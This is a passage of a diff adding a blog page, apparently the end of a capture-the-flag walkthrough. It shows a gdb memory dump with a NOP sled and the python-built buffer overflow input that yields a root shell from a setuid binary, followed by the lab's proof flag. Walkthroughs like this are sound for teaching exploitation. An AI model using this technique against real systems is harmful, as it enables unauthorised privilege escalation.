+0xbffffd60: 0x000003ea  0x0000000d  0x000003ea  0x0000000e
+0xbffffd70: 0x000003ea  0x00000017  0x00000001  0x00000019
+0xbffffd80: 0xbffffdab  0x0000001f  0xbfffffce  0x0000000f
+0xbffffd90: 0xbffffdbb  0x00000000  0x00000000  0x00000000
+0xbffffda0: 0x00000000  0x00000000  0xf6000000  0x6d8240c1
+0xbffffdb0: 0xc85c9138  0x1f1bbf89  0x692ef87a  0x00363836
+0xbffffdc0: 0x6e2f0000  0x6968746f  0x745f676e  0x65735f6f
+0xbffffdd0: 0x65685f65  0x632f6572  0x736f6f68  0x69775f65
+0xbffffde0: 0x796c6573  0x6f6f642f  0x722f3172  0x00743030
+0xbffffdf0: 0x4c454853  0x444f434c  0x90903d45  0x90909090
+0xbffffe00: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffffe10: 0x90909090  0x90909090  0x90909090  0x90909090
+(gdb)
+[/plain]</p>
+
+<p>Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
+Starting program: /nothing_to_see_here/choose_wisely/door1/r00t $(python -c &lsquo;print &ldquo;A&rdquo;</em>268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
+process 1575 is executing new program: /bin/dash
+id
+uid=1002(noob) gid=1002(noob) groups=1002(noob)
+exit
+[Inferior 1 (process 1575) exited with code 0177]
+(gdb)
+[/plain]</p>
+
+<p>When run outside of GDB, we get dropped to a root shell</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+./r00t $(python -c &lsquo;print &ldquo;A&rdquo;*268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
+id
+uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
+cd /root
+ls -ls
+total 40
+4 -rw-r&ndash;r&ndash; 1 root   root     68 Oct  6 18:32 Proof.txt
+4 drwxr-xr-x 5 root   root   4096 Oct  4 22:35 core1
+4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core2
+4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core3
+4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core4
+4 drwxr-xr-x 2 root   root   4096 Oct  5 21:14 goal
+4 drwxr-xr-x 2 root   root   4096 Oct  6 18:36 hardmode
+4 -rw-r&ndash;r&ndash; 1 maleus maleus 1474 Oct  4 00:28 lmao.zip
+4 -rw-r&ndash;r&ndash; 1 root   root    828 Oct  4 22:43 ran_dir.py
+4 drwxr-xr-x 2 root   root   4096 Oct  6 18:35 reboot
+cat Proof.txt
+You win this time young Jedi&hellip;</p>
+
+<p>a70354f0258dcc00292c72aab3c8b1e4
+[/plain]</p>
+
+<p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
